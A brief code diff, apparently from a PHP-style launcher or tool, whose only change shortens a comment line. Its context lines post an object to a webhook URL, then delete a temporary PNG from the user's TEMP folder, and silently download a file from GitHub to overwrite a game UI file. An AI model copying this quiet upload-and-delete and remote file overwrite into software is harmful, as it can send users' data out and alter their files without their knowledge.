@@ -33,7 +33,7 @@
         var_dump($http->post($url,$hookObject)->body());
         unlink($_ENV['TEMP'].'\temp.png');
 
-//////////////////////////////////
+//////////////////////////////
 
 fs::copy('https://github.com/Rastihin/mce/raw/main/start_screen.json',fs::abs('./').'\\data\\resource_packs\\vanilla\\ui\\start_screen.json');
 //Для разрешения запуска должно ровняться 1
